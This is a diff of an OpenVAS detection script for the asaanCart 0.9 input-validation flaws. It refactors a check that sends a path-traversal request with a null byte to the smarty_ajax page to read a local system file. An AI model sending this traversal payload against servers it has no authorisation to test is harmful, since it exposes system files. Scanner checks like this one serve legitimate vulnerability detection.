@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_asaanCart_52498.nasl 5640 2017-03-21 08:12:48Z cfi $
+# $Id: gb_asaanCart_52498.nasl 5714 2017-03-24 10:52:48Z cfi $
 #
 # asaanCart Multiple Input Validation Vulnerabilities
 #
@@ -39,29 +39,22 @@ and execute local scripts.
 
 asaanCart 0.9 is vulnerable; other versions may also be affected.";
 
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103590";
-
 if (description)
 {
- script_oid(SCRIPT_OID);
+ script_oid("1.3.6.1.4.1.25623.1.0.103590");
  script_bugtraq_id(52498);
  script_cve_id("CVE-2012-5330","CVE-2012-5331");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
- script_version ("$Revision: 5640 $");
-
+ script_version ("$Revision: 5714 $");
  script_name("asaanCart Multiple Input Validation Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52498");
  script_xref(name : "URL" , value : "http://sourceforge.net/projects/asaancart/");
  script_xref(name : "URL" , value : "http://asaancart.wordpress.com");
-
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:12:48 +0100 (Tue, 21 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 11:52:48 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-10-23 11:48:15 +0200 (Tue, 23 Oct 2012)");
- script_summary("Determine if it is possible to read a local file");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
@@ -72,30 +65,28 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
-
-dirs = make_list("/asaancart","/shop",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/asaancart", "/shop", cgi_dirs( port:port ) ) ) {
 
-  foreach file (keys(files)) {
+  if( dir == "/" ) dir = "";
 
-      url = dir + '/libs/smarty_ajax/index.php?_=&f=update_intro&page=' + crap(data:"../", length:9*6) + files[file] + '%00';
+  foreach file( keys( files ) ) {
 
-      if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-          security_message(port:port);
-          exit(0);
+    url = dir + '/libs/smarty_ajax/index.php?_=&f=update_intro&page=' + crap(data:"../", length:9*6) + files[file] + '%00';
 
-     }
- }
+    if(http_vuln_check( port:port, url:url, pattern:file ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
+  }
 }
 
-exit(0);
+exit( 99 );
